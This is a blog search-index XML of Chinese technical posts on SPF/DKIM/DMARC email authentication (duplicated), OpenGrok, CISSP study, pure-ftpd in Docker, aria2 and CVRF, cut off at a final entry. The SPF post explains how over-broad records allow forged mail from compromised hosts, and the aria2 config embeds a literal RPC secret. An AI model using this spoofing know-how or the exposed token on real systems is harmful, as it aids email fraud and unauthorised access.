<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[反垃圾邮件技术及可能存在的问题(SPF/DKIM/DMARC)]]></title>
    <url>%2F2019%2F%E5%8F%8D%E5%9E%83%E5%9C%BE%E9%82%AE%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98-SPF-DKIM-DMARC%2F</url>
    <content type="text"><![CDATA[一般未配置SPF/DKIM/DMARC的邮件服务器存在两种安全问题：邮件诈骗和邮件反向散射。 SPF：校验发件端IP地址，防止邮件诈骗。DKIM：校验邮件签名信息，防止邮件诈骗和邮件反向散射。MDARC：基于SPF/DKIM，按照真实发件端的声明进行真实性验证及异常报告。 SPF SPF原理 SPF(Sender Policy Framework) 是一种以IP地址认证电子邮件发件人身份的技术，通过认证发件IP与发件域名中的声明进行匹配，从而防止别人伪造你来发邮件。 SPF验证过程 接收端获取发件端IP(发送端的连接IP，无法改变). 接收端查询发件域名(SMTP会话过程中，MAIL FROM指令中的用户名域名部分)的txt记录 根据SPF记录的规则进行匹配，可按声明的策略进行处理。 SPF配置 参考RFC 4408标准，在DNS上新建一条txt记录，内容类似如下： 安全性问题 邮件伪造 这是最众所周知的问题，如果没有配置SPF，攻击者可以任意伪造邮件，相关的伪造方式可以参考我之前的文章: SMTP命令行及Python发送邮件 SPF过配置 假设一种情况，如果我的SMTP服务器是：10.1.1.2和10.1.1.110，为了方便起见，将SPF记录设置为：v=spf1 ip4:10.1.1.0/24 -all。 那么这就存在安全隐患了，在该C段里面，任意一台主机被getshell，那么攻击者就可以通过合法的IP发送伪造邮件了。 如下例子中，8组C段，共计2000多个IP，无论这些IP是否属于该单位，均有很大的可能性被getshell. 通过简单扫描(nmap -F)，发现大量资产： 不能防护子域名域名？ （待验证） 不确定是否因为SPF可以保护或者只是网易的反垃圾邮件机制好，测试暂未通过： DKIM区别于SPF，DKIM使用非对称加密的方式对发件人进行身份验证。 DKIM原理DMKI（DomainKeys Identified Mail）是基于传统的密钥认证方式，它会产生两组钥匙，公钥(public key)和私钥(private key)，公钥将会存放在 DNS 中，而私钥会存放在邮件发送服务器中。数字签名会自动产生，并依附在邮件头中，发送到寄信者的服务器里。公钥则放在DNS服务器上，供自动获得。收信的服务器，将会收到夹带在邮件头中的签名和在DNS上自己获取公钥，然后进行比对，比较寄信者的域名是否合法，如果不合法，则判定为垃圾邮件。 DKIM验证过程 发送端： 生成一对密钥，即公钥和私钥。 通过DNS发送domainkey的公钥。 发送邮件时，用私钥加密该邮件，并将加密后的密文附加到邮件中。 接收端： 提取信头中dkim信头，并查询该发件域的公钥。 利用该公钥，对信头中的密文进行验证。 查询该域名的_adsp._domainkey记录，可按该策略进行处理。 DKIM配置 确定一个(或多个) DKIM selector(s)，比如default._domainkey、beijing._domainkey、subcompany._domainkey，用于配置不同的公私玥。 使用openssl工具生产一对(或多对)公钥和密钥。 在邮件服务器上配置DKIM（具体不会，可询问邮件供应商）。 在DNS上给DKIM selector(s)添加txt记录，比如： 新建foobar._domainkey.oddboy.cn的TXT记录，内容： v=DKIM1; g=*; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC8T/rJ2fc7nPxDHF/wjTYgDXCjRDDudAuS1eJ7SAUY06BBZuUXhLus2jWpHL5e3YugU9+NoHJsG9g+B34PJxaSnMhcOwrybMsv9ovMuQtzZO5/wDobO0Usc6HIj5K0y9JL7Kqlq5zUv3KDIE3ZOA3aVkgeeeo6Er91Oc8DpwcopwIDAQAB 查看DKIM记录： 安全性问题 DKMI绕过暂时未具体研究，可参考文章：绕过DKIM验证，伪造钓鱼邮件 DMARCDMARC（Domain-based Message Authentication, Reporting and Conformance）和其他电邮安全协议的美好初衷一样，主要目的是识别并拦截钓鱼邮件，使钓鱼邮件不再进入用户邮箱中（收件箱or垃圾箱），减少邮箱用户打开/阅读到钓鱼邮件的可能性，从而保护用户的帐号密码等个人信息安全。 DMARC原理 DMARC协议基于现有的SPF和DKIM两大主流电子邮件安全协议，由邮件发送方在DNS里声明自己采用该协议，当邮件接收方（其MTA需支持DMARC协议）收到邮件时进行DMARC校验，若校验失败发送一封report到指定URI（通常是一个邮箱地址）。 DMARC验证过程 发送端 正确配置SPF和DKIM。 发布_dmarc的TXT记录。 - 接收端 1. 查询_dmarc记录 2. 验证SPF 3. 验证DKIM 4. 验证DMARC 5. 按策略处理，同时发送通知邮件 DMARC配置 RFC 7489规范 常用参数 adkim：（纯文本；可选的；默认为“r”）表明域名所有者要求使用严格的或者宽松的DKIM身份校验模式，有效值如下： r: relaxed mode s: strict mode aspf：（纯文本；可选的；默认为“r”）表明域名所有者要求使用严格的或者宽松的SPF身份校验模式，有效值如下： r: relaxed mode s: strict mode fo：故障报告选项（纯文本；可选的；默认为0），以冒号分隔的列表，如果没有指定“ruf”，那么该标签的内容将被忽略。 0：如果所有身份验证机制都不能产生“pass”结果，那么生成一份DMARC故障报告； 1：如果任一身份验证机制产生“pass”以外的结果，那么生成一份DMARC故障报告； d：如果消息的签名验证失败，那么生成一份DKIM故障报告； s：如果消息的SPF验证失败，那么生成一份SPF故障报告。 p：要求的邮件接收者策略（纯文本；必要的）表明接收者根据域名所有者的要求制定的策略。 none：域名所有者要求不采取特定措施 quarantine：域名所有者希望邮件接收者将DMARC验证失败的邮件标记为可疑的。 reject：域名所有者希望邮件接收者将DMARC验证失败的邮件拒绝。 pct：（纯文本0-100的整型；可选的，默认为100）域名所有者邮件流中应用DMARC策略的消息百分比。 rf：用于消息具体故障报告的格式（冒号分隔的纯文本列表；可选的；默认为“afrf”） ri：汇总报告之间要求的间隔（纯文本32位无符号整型；可选的；默认为86400）.表明要求接收者生成汇总报告的间隔不超过要求的秒数。 rua：发送综合反馈的邮件地址（逗号分隔的DMARC URI纯文本列表；可选的） ruf：发送消息详细故障信息的邮件地址（逗号分隔的DMARC URI纯文本列表；可选的） sp：要求邮件接收者对所有子域使用的策略（纯文本；可选的），若缺省，则“p”指定的策略将应用到该域名和子域中。 v：版本（纯文本；必要的）值为“DMARC1”，必须作为第一个标签。 示例 “v=DMARC1;p=reject;pct=100;rua=mailto:postmaster@dmarcdomain.com“ 解读：协议版本为DMARC1，收件方对所有(100%，默认100%)进行检查，当检测到邮件伪造时收件方拒绝(reject)该邮件，并且将一段时间的汇总报告到`postmaster@dmarcdomain.com`。 查看DMARC记录： 安全性问题 不安全配置导致问题 比如，在初期测试阶段会将DMARC记录配置为”p=none”，但在生产中未修改到reject活着quarantine，则相当于未起到任何作用，所有的欺诈邮件都会被通过，即使配置了SPF和DKIM。 参考链接SPF 记录：原理、语法及配置方法简介 绕过DKIM验证，伪造钓鱼邮件 DKIM - 域名密钥识别邮件 DMARC官方]]></content>
      <tags>
        <tag>SMTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反垃圾邮件技术及可能存在的问题(SPF/DKIM/DMARC)]]></title>
    <url>%2F2019%2FSMTP%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[一般未配置SPF/DKIM/DMARC的邮件服务器存在两种安全问题：邮件诈骗和邮件反向散射。 SPF：校验发件端IP地址，防止邮件诈骗。DKIM：校验邮件签名信息，防止邮件诈骗和邮件反向散射。MDARC：基于SPF/DKIM，按照真实发件端的声明进行真实性验证及异常报告。 SPF SPF原理 SPF(Sender Policy Framework) 是一种以IP地址认证电子邮件发件人身份的技术，通过认证发件IP与发件域名中的声明进行匹配，从而防止别人伪造你来发邮件。 SPF验证过程 接收端获取发件端IP(发送端的连接IP，无法改变). 接收端查询发件域名(SMTP会话过程中，MAIL FROM指令中的用户名域名部分)的txt记录 根据SPF记录的规则进行匹配，可按声明的策略进行处理。 SPF配置 参考RFC 4408标准，在DNS上新建一条txt记录，内容类似如下： 安全性问题 邮件伪造 这是最众所周知的问题，如果没有配置SPF，攻击者可以任意伪造邮件，相关的伪造方式可以参考我之前的文章: SMTP命令行及Python发送邮件 SPF过配置 假设一种情况，如果我的SMTP服务器是：10.1.1.2和10.1.1.110，为了方便起见，将SPF记录设置为：v=spf1 ip4:10.1.1.0/24 -all。 那么这就存在安全隐患了，在该C段里面，任意一台主机被getshell，那么攻击者就可以通过合法的IP发送伪造邮件了。 如下例子中，8组C段，共计2000多个IP，无论这些IP是否属于该单位，均有很大的可能性被getshell. 通过简单扫描(nmap -F)，发现大量资产： 不能防护子域名域名？ （待验证） 不确定是否因为SPF可以保护或者只是网易的反垃圾邮件机制好，测试暂未通过： DKIM区别于SPF，DKIM使用非对称加密的方式对发件人进行身份验证。 DKIM原理DMKI（DomainKeys Identified Mail）是基于传统的密钥认证方式，它会产生两组钥匙，公钥(public key)和私钥(private key)，公钥将会存放在 DNS 中，而私钥会存放在邮件发送服务器中。数字签名会自动产生，并依附在邮件头中，发送到寄信者的服务器里。公钥则放在DNS服务器上，供自动获得。收信的服务器，将会收到夹带在邮件头中的签名和在DNS上自己获取公钥，然后进行比对，比较寄信者的域名是否合法，如果不合法，则判定为垃圾邮件。 DKIM验证过程 发送端： 生成一对密钥，即公钥和私钥。 通过DNS发送domainkey的公钥。 发送邮件时，用私钥加密该邮件，并将加密后的密文附加到邮件中。 接收端： 提取信头中dkim信头，并查询该发件域的公钥。 利用该公钥，对信头中的密文进行验证。 查询该域名的_adsp._domainkey记录，可按该策略进行处理。 DKIM配置 确定一个(或多个) DKIM selector(s)，比如default._domainkey、beijing._domainkey、subcompany._domainkey，用于配置不同的公私玥。 使用openssl工具生产一对(或多对)公钥和密钥。 在邮件服务器上配置DKIM（具体不会，可询问邮件供应商）。 在DNS上给DKIM selector(s)添加txt记录，比如： 新建foobar._domainkey.oddboy.cn的TXT记录，内容： v=DKIM1; g=*; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC8T/rJ2fc7nPxDHF/wjTYgDXCjRDDudAuS1eJ7SAUY06BBZuUXhLus2jWpHL5e3YugU9+NoHJsG9g+B34PJxaSnMhcOwrybMsv9ovMuQtzZO5/wDobO0Usc6HIj5K0y9JL7Kqlq5zUv3KDIE3ZOA3aVkgeeeo6Er91Oc8DpwcopwIDAQAB 查看DKIM记录： 安全性问题 DKMI绕过暂时未具体研究，可参考文章：绕过DKIM验证，伪造钓鱼邮件 DMARCDMARC（Domain-based Message Authentication, Reporting and Conformance）和其他电邮安全协议的美好初衷一样，主要目的是识别并拦截钓鱼邮件，使钓鱼邮件不再进入用户邮箱中（收件箱or垃圾箱），减少邮箱用户打开/阅读到钓鱼邮件的可能性，从而保护用户的帐号密码等个人信息安全。 DMARC原理 DMARC协议基于现有的SPF和DKIM两大主流电子邮件安全协议，由邮件发送方在DNS里声明自己采用该协议，当邮件接收方（其MTA需支持DMARC协议）收到邮件时进行DMARC校验，若校验失败发送一封report到指定URI（通常是一个邮箱地址）。 DMARC验证过程 发送端 正确配置SPF和DKIM。 发布_dmarc的TXT记录。 - 接收端 1. 查询_dmarc记录 2. 验证SPF 3. 验证DKIM 4. 验证DMARC 5. 按策略处理，同时发送通知邮件 DMARC配置 RFC 7489规范 常用参数 adkim：（纯文本；可选的；默认为“r”）表明域名所有者要求使用严格的或者宽松的DKIM身份校验模式，有效值如下： r: relaxed mode s: strict mode aspf：（纯文本；可选的；默认为“r”）表明域名所有者要求使用严格的或者宽松的SPF身份校验模式，有效值如下： r: relaxed mode s: strict mode fo：故障报告选项（纯文本；可选的；默认为0），以冒号分隔的列表，如果没有指定“ruf”，那么该标签的内容将被忽略。 0：如果所有身份验证机制都不能产生“pass”结果，那么生成一份DMARC故障报告； 1：如果任一身份验证机制产生“pass”以外的结果，那么生成一份DMARC故障报告； d：如果消息的签名验证失败，那么生成一份DKIM故障报告； s：如果消息的SPF验证失败，那么生成一份SPF故障报告。 p：要求的邮件接收者策略（纯文本；必要的）表明接收者根据域名所有者的要求制定的策略。 none：域名所有者要求不采取特定措施 quarantine：域名所有者希望邮件接收者将DMARC验证失败的邮件标记为可疑的。 reject：域名所有者希望邮件接收者将DMARC验证失败的邮件拒绝。 pct：（纯文本0-100的整型；可选的，默认为100）域名所有者邮件流中应用DMARC策略的消息百分比。 rf：用于消息具体故障报告的格式（冒号分隔的纯文本列表；可选的；默认为“afrf”） ri：汇总报告之间要求的间隔（纯文本32位无符号整型；可选的；默认为86400）.表明要求接收者生成汇总报告的间隔不超过要求的秒数。 rua：发送综合反馈的邮件地址（逗号分隔的DMARC URI纯文本列表；可选的） ruf：发送消息详细故障信息的邮件地址（逗号分隔的DMARC URI纯文本列表；可选的） sp：要求邮件接收者对所有子域使用的策略（纯文本；可选的），若缺省，则“p”指定的策略将应用到该域名和子域中。 v：版本（纯文本；必要的）值为“DMARC1”，必须作为第一个标签。 示例 “v=DMARC1;p=reject;pct=100;rua=mailto:postmaster@dmarcdomain.com“ 解读：协议版本为DMARC1，收件方对所有(100%，默认100%)进行检查，当检测到邮件伪造时收件方拒绝(reject)该邮件，并且将一段时间的汇总报告到`postmaster@dmarcdomain.com`。 查看DMARC记录： 安全性问题 不安全配置导致问题 比如，在初期测试阶段会将DMARC记录配置为”p=none”，但在生产中未修改到reject活着quarantine，则相当于未起到任何作用，所有的欺诈邮件都会被通过，即使配置了SPF和DKIM。 参考链接SPF 记录：原理、语法及配置方法简介 绕过DKIM验证，伪造钓鱼邮件 DKIM - 域名密钥识别邮件 DMARC官方]]></content>
      <tags>
        <tag>SMTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Opengrok安装 on Mac]]></title>
    <url>%2F2019%2FOpengrok%E5%AE%89%E8%A3%85-on-mac%2F</url>
    <content type="text"><![CDATA[概述https://github.com/oracle/opengrok 安装 安装JDK1.8或者更高 sudo apt-get updatesudo apt-get install sudo openjdk-8-jdk 安装Tomcat8https://tomcat.apache.org/download-80.cgi tar xvzf apache-tomcat-8.5.28.tar.gzsudo mv apache-tomcat-8.5.28 /opt/tomcat/./opt/tomcat/bin/startup.sh # 启动Tomcat 安装universal-ctags（exuberant-ctags已不更新） sudo apt-get purge ctagsgit clone https://github.com/universal-ctags/ctags.gitcd ctags# ./autogen.sh ./configuremakesudo make install 安装opengrokhttps://github.com/oracle/opengrok/releases sudo tar zxvf opengrok-1.2.7.tar.gz -C /optsudo mv /opt/opengrok-1.2.7 /opt/opengrokcd /opt/opengrok/toolssudo python3 -m pip install opengrok-tools.tar.gz 配置 创建相关目录 sudo mkdir -p /var/opengrok/etc # Opengrok配置文件目录sudo mkdir -p /var/opengrok/src # Opengrok索引代码目录（可以指定任意目录）sudo mkdir -p /var/opengrok/data # Opengrok索引数据目录 将待审计源码copy到grok代码目录 cd /var/opengrok/srcgit clone https://github.com/apache/shiro # 下载shiro源码 部署Opengrok sudo cp /opt/opengrok/lib/source.war /opt/tomcat/webapps 可访问http://localhost:8080/source，但目前提示&quot;There was an error!” 生成/更新索引opengrok-indexer -J=-Djava.util.logging.config.file=/var/opengrok/logging.properties \ -a /opt/opengrok/lib/opengrok.jar -- \ -c /usr/local/bin/ctags \ -s /var/opengrok/src -d /var/opengrok/data -H -P -S -G \ -W /var/opengrok/etc/configuration.xml -U http://localhost:8080/source 参考资料Opengrok的安装及配置How to setup OpenGrok]]></content>
  </entry>
  <entry>
    <title><![CDATA[CISSP之速战速决]]></title>
    <url>%2F2019%2FCISSP%E4%B9%8B%E9%80%9F%E6%88%98%E9%80%9F%E5%86%B3%2F</url>
    <content type="text"><![CDATA[我是去年六七月份决定考CISSP的，在今年过完春节后的一个月集中学习，3月12号考试通过。总的来讲，我觉得有效学习时间总共360小时是绰绰有余的，如果学习比较集中连续的话，时间可以缩减到250小时。 看书书我用的是《CISSP官方学习指南第7版》，但我想《All In One》也没啥区别。重点在于书得看至少三遍： 第一遍：不求甚解 - 估摸着40-50小时我第一遍看的时候，感觉挺多东西都不明白，稀里糊涂的。不过没有太深究，按着一天看多少内容的预计，囫囵吞枣过一遍，书上自带的练习题都没碰。个人由于工作方面的原因，书看了一大半后就半年没碰，春节前十来天在 Pearson VUE 预约了3月12号的考试，然后趁着春节前几天完成了这一步。 第二遍：细嚼慢咽 - 半个月时间大概80-120小时过完春节后，我开始看第二遍书，除了个别废话基本每个字都看，对于重点的地方勾勾画画(一来辅助看书进程，二来为第三遍看书做准备)，单元练习题给做了，附带的练习册也做了。原则上，把涉及到的知识点都理解到位，实际上我自己在这个过程中也有一些没太明白的地方，或者感觉挺复杂的地方。总的来讲，看完第二遍之后大部分的知识点多多少少还是有点感觉了。 第三遍：关注重点 - 20小时我在汇安全上的模考结果不理想，当时有点慌，本来死马当活马医，临近考试的两天，参照着每章节后的“考试要点”把书上勾画的东西过了一遍。过完一遍的结果就是：不慌了。感觉自己没有新学到太多，但心里感觉有点谱了，这算是考前心态没崩的原因吧。 做题做题主要是为了熟悉题目的感觉，印证书上学到的知识点，确定遗漏点。最开始我以为考试会出现不少原题什么的，但实际上出现原题很少。 书本自带练习题第二遍看书过程中做题。 官方练习册 - 30小时8大CBK，在第二遍看书过程中，每完成一个CBK，把相应的练习册上题做完。结束后，再将附带的两套模拟题做完。 汇安全(汇哲题库) - 15小时我只做了上面的三套模拟题，各CBK的题没时间做了。 最后就是汇哲的一天模拟考。 练习题里面有些答案可能是不对的，但考试的时候并不太遇到这样的题目。 培训班关于培训只有一点，强烈建议在至少看完第一遍书之后再去听课，我还没怎么看书就去听的，基本听不明白，更get不到老师讲的重点。 其他 思维导图有老师建议自己用思维导图梳理各知识模块，我觉得如果时间足够的话，可以试着这样做。但确实太耗时间，而且很难弄。 有些知识点还得费劲去考虑怎么分类啥的。 我看汇哲提供的思维导图pdf，看完了第一个CBK后就看不下去了。 书上的图表都挺重要书上的图、表、流程图什么的最好都理解并记住，挺容易出题目的。 法律法规不考我考试过程中貌似没遇到一道关于法律法规的，只有一道关于(ISC)2道德的。 考试时间绰绰有余考试360分钟，每道题仔细做都是足够的，所以不用急，把题整明白。 另外，我每做完100道题，休息了一次。 在150道题的时候，明显感觉脑子不转了，一道题反复看几遍才看明白意思，提前做好思想准备，不要有心理负担。 检查做题过程中，可以给题目做标记，最后检查。检查过程中，我改了三五道题吧，不敢瞎改。 考试当天带好干粮和水，身份证 + 其他一个证件(信用卡 / 驾照 / 护照) 这才是真相 (手动滑稽)]]></content>
      <tags>
        <tag>CISSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker快速部署pure-ftp]]></title>
    <url>%2F2018%2FDocker%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2pure-ftp%2F</url>
    <content type="text"><![CDATA[Docker Hub页面 :: https://hub.docker.com/r/stilliard/pure-ftpd/ 下载pure-ftp镜像$ docker pull stilliard/pure-ftpd:hardened 运行容器$ docker run -dt --name pure-ftp -p 21:21 -p 30000-31111:30000-31111 -e "PUBLICHOST=localhost" --privileged=true -v /home/ftpusers/robin:/home/ftpusers/www stilliard/pure-ftpd bash 新建用户 &amp; 运行FTP$ docker exec -it pure-ftp /bin/bash # 进入docker的命令行终端 &gt; pure-pw useradd www -u ftpuser -d /home/ftpusers/www # 新建www用户 &gt; pure-pw mkdb # 保存 &gt; /usr/sbin/pure-ftpd -c 100 -C 100 -l puredb:/etc/pure-ftpd/pureftpd.pdb -E -j -R -P $PUBLICHOST -p 30000:31111 &amp; # 运行FTP服务 备注客服端登录时，传输模式选择为主动 docker run –rm -d –name ftpd_server -p 21:21 -p 30000-30009:30000-30009 stilliard/pure-ftpd:hardened bash /run.sh -c 30 -C 10 -l puredb:/etc/pure-ftpd/pureftpd.pdb -E -j -R -P localhost -p 30000:30059]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[aria2安装及使用]]></title>
    <url>%2F2018%2Faria2%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[之前的百度网盘会员过期了，下载一点点东西慢出翔。鉴于目前穷困潦倒的生活状态，还是用用免费的好了。所以通过aria2这个工具做一点点改善就成了一个可选项。 aria2安装及配置使用homebrew安装aria2c$ brew install aria2# 安装往常后,运行 aria2c$ aria2c -h # 查看帮助$ man aria2c# 开启RPC服务()$ aria2c --enable-rpc --rpc-listen-all -c -x 16 -d /Users/bingo/Downloads --rpc-secret=&lt;--mytoken--&gt; aria2c配置(RPC mode) 创建 aria2.conf $ mkdir ~/.aria2$ cd ~/.aria2$ touch aria2.conf$ vim aria2.conf 配置 aria2.conf # vim aria2.conf#用户名#rpc-user=user#密码#rpc-passwd=passwd#上面的认证方式不建议使用,建议使用下面的token方式#设置加密的密钥rpc-secret=656CjCKQ0iQUB78eXgIe4TJz8V8i7OdV#允许rpcenable-rpc=true#允许所有来源, web界面跨域权限需要rpc-allow-origin-all=true#允许外部访问，false的话只监听本地端口rpc-listen-all=false#RPC端口, 仅当默认端口被占用时修改#rpc-listen-port=6800#最大同时下载数(任务数), 路由建议值: 3max-concurrent-downloads=5#断点续传continue=true#同服务器连接数max-connection-per-server=10#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要min-split-size=10M#单文件最大线程数, 路由建议值: 5split=10#下载速度限制max-overall-download-limit=0#单文件速度限制max-download-limit=0#上传速度限制max-overall-upload-limit=0#单文件速度限制max-upload-limit=0#断开速度过慢的连接#lowest-speed-limit=0#验证用，需要1.16.1之后的release版本#referer=*#文件保存路径, 默认为当前启动位置dir=/Users/xxx/Downloads#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本#disk-cache=0#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)#enable-mmap=true#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长#所需时间 none &lt; falloc ? trunc &lt;&lt; prealloc, falloc和trunc需要文件系统和内核支持file-allocation=prealloc 启动aria2 $ aria2c --conf-path=/Users/xxx/.aria2/aria2.conf -D 前端工具 百度网盘 BaiduExporter for Chrome https://github.com/acgotaku/BaiduExporter 不知何故，点击“ARIA2 RPC”无法使用，使用文本导出，在终端执行。看起来不完美，但不可否认，速度提升了。 不支持rpc-secret，如需使用，需要在配置文件中去除 rpc-secret 配置。 webui-aria2 https://github.com/ziahamza/webui-aria2 $ git clone --depth 1 https://github.com/ziahamza/webui-aria2$ cd webui-aria2$ open index.html # 因为这是纯前端的应用，所以直接用浏览器打开index.html即可$ node node-server.js # 启动服务 # WebUI Aria2 Server is running on http://localhost:8888 前端界面除了webui-aria2外，还有如下两三种，但都不能填入身份验证信息(配置文件中需要移除 rpc-secret )，有不安全的嫌疑。 YAAW-for-Chrome (Yet Another Aria2 Web Frontend) https://github.com/acgotaku/YAAW-for-Chrome Aria2GUI https://github.com/yangshun1029/aria2gui 其实跟YAAW是同一个东西，只不过是本地端软件。 Safari2Aria https://github.com/miniers/safari2aria 后记后续有空的话，可以考虑fork相关项目，进行些代码贡献，至少添加些参数还是问题不大的。]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVRF(Common Vulnerability Reporting Framework)]]></title>
    <url>%2F2018%2FCVRF-Common-Vulnerability-Reporting-Framework%2F</url>
    <content type="text"><![CDATA[各个厂商对漏洞的描述信息不一致，致使在统一收集、存储、分析漏洞时存在问题，故而参考被广泛采用的CVRF规范应该是一个不错的选择。 介绍通用漏洞报告框架(Common Vulnerability Reporting Framework)是一个基于XML语言的漏洞描述框架，它可以让不同的安全组织以统一的格式共享安全相关的信息。CVRF 1.1版 由ICASI于2012年发布，当前已经贡献给OASIS，由通用安全通报框架（CSAF）技术委员会（TC）进一步改进，当前版本为2017年9月发布的 CVRF 1.2版本 官方文档http://docs.oasis-open.org/csaf/csaf-cvrf/v1.2/csaf-cvrf-v1.2.pdfhttp://docs.oasis-open.org/csaf/csaf-cvrf/v1.2/csaf-cvrf-v1.2.htmlhttp://docs.oasis-open.org/csaf/csaf-cvrf/v1.2/csaf-cvrf-v1.2.docx 术语 CCE - 通用配置枚举 CSAF - 共同安全咨询框架 CPE - 通用平台枚举[ CPE23-N ] CSIRT - 计算机安全事件响应小组 CVE - 常见漏洞和披露[ CVE ] CVRF - 通用漏洞报告框架 CVSS - 通用漏洞评分系统[ CVSS ] CWE - 常见弱点枚举[ CWE ] ICASI - 互联网安全促进互联网联盟，http://www.icasi.org/ ID - 标识符 OASIS - 推进结构化信息标准组织，https://www.oasis-open.org/ PSIRT - 产品安全事件响应小组 URL - 统一资源定位器 UTC - 协调世界时（缩写：协调世界时）[ ISO8601 ] 设计注意事项 最少顶层元素 标题 Title: cvrf:DocumentTitle 类型 Type: cvrf:DocumentType 发布者 Publisher: cvrf:DocumentPublisher 跟踪 Tracking: cvrf:DocumentTracking 最多顶层元素 标题 Title: cvrf:DocumentTitle 类型 Type: cvrf:DocumentType 发布者 Publisher: cvrf:DocumentPublisher 跟踪 Tracking: cvrf:DocumentTracking 注释 Notes: cvrf:DocumentNotes 分布 Distribution: cvrf:DocumentDistribution 聚合严重性 Aggregate Severity: cvrf:AggregateSeverity 参考文献 References: cvrf:DocumentReferences 致谢 Acknowledgements: cvrf:Acknowledgements 产品树 Product Tree: prod:ProductTree 漏洞 Vulnerability: vuln:Vulnerability 设计原则领域模型(Domain Models)Date/Time 模型 CVRF文档中的所有日期时间值必须遵循 ISO 8601 基本格式或扩展格式.协调世界时（UTC）是世界范围内交换和使用的日期时间信息的最佳拟合时间系统。 YYYYMMDDTHHMMSSZ YYYYMMDDTHHMMSS + HHMM YYYY-MM-DDTHH：MM：SSZ YYYY-MM-DDTHH：MM：SS + HH：MM YYYYMMDDThhmmss.sZ YYYYMMDDThhmmss.s + HHMM YYYY-MM-DDTHH：MM：ss.sZ YYYY-MM-DDTHH：MM：SS.S + HH：MM T 分隔符字面量必须保持不变；时区计算也不在本规范的范围内。 Note 类型模型 Description Details FAQ General Legal Disclaimer Other Summary Product Branch 类型模型如下11个类别 必须 用于 Branch 类型字段。 Architecture Host Name Language Legacy Patch Level Product Family Product Name Product Version Service Pack Specification Vendor Product Relationship 类型模型如下5个类别 必须 用于 Product Relationship 类型字段。 Default Component Of External Component Of Installed On Installed With Optional Component Of Publisher 类型模型如下5个类别 必须 用于 Publisher 字段。 Coordinator Discoverer Other User Vendor Reference 类型模型Reference元素的Type属性必须为如下2个类别之一。 External Self Status 类型模型文档的状态必须为如下三者之一。 Draft Interim Final Version 类型模型通常表示为：nn.nn.nn.nn，必须匹配正则表达式：(0|[1-9][0-9]*)(\.(0|[1-9][0-9]*)){0,3}第一部分：主要版本号第二部分：次要版本号第三部分：补丁版本号第四部分：内部版本号 Vulnerability CVE 类型模型CVE编号，正则匹配：CVE-[0-9 \ - ] + Vulnerability CVSS 2.0 类型模型 非本文档范围 Vulnerability CVSS 3.0 类型模型 非本文档范围 Vulnerability CWE 类型模型CWE编号，正则匹配：CWE-[1-9]\d{0,5} Vulnerability ID 类型模型ID值必须是字母数字标记，一般由供应商自定义。 Vulnerability Involvement 类型模型漏洞状态 Completed Contact Attempted Disputed In Progress Not Contacted Open Vulnerability Product Affected Status 类型模型漏洞产品影响状态 First Affected Known Affected Known Not Affected First Fixed Fixed Recommended Last Affected Vulnerability Remediation 类型模型漏洞修复类型 Workaround Mitigation Vendor Fix None Available Will Not Fix Vulnerability Threat 类型模型漏洞威胁类型 Impact Exploit Status Target Set CVRF模型树图文档(上下文)架构元素9个顶级元素在CVRF XML架构文件中被定义，且必须按如下顺序出现： 标题 Title: cvrf:DocumentTitle 类型 Type: cvrf:DocumentType 发布者 Publisher: cvrf:DocumentPublisher 跟踪 Tracking: cvrf:DocumentTracking 注释 Notes: cvrf:DocumentNotes 分布 Distribution: cvrf:DocumentDistribution 聚合严重性 Aggregate Severity: cvrf:AggregateSeverity 参考文献 References: cvrf:DocumentReferences 致谢 Acknowledgements: cvrf:Acknowledgements 产品树架构元素如下4个二级元素必须顺序出现： Branch: prod:Branch Full Product Name: prod:FullProductName Relationship: prod:Relationship Product Groups: prod:ProductGroups 漏洞架构元素漏洞详情数据，如下14个二级字段必须顺序出现： Title: vuln:Title ID: vuln:ID Notes: vuln:Notes Discovery Date: vuln:DiscoveryDate Release Date: vuln:ReleaseDate Involvements: vuln:Involvements CVE: vuln:CVE CWE: vuln:CWE Product Statuses: vuln:ProductStatuses Threats: vuln:Threats CVSS Score Sets: vuln:CVSSScoreSets Remediations: vuln:Remediations References: vuln:References Acknowledgements: vuln:Acknowledgements 文档结构图 附录http://docs.oasis-open.org/csaf/csaf-cvrf/v1.2/cs01/csaf-cvrf-v1.2-cs01.html]]></content>
      <tags>
        <tag>cvrf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用SQLalchemy保存数据到SQLite]]></title>
    <url>%2F2018%2F%E4%BD%BF%E7%94%A8SQLalchemy%E4%BF%9D%E5%AD%98%E6%95%B0%E6%8D%AE%E5%88%B0SQLite%2F</url>
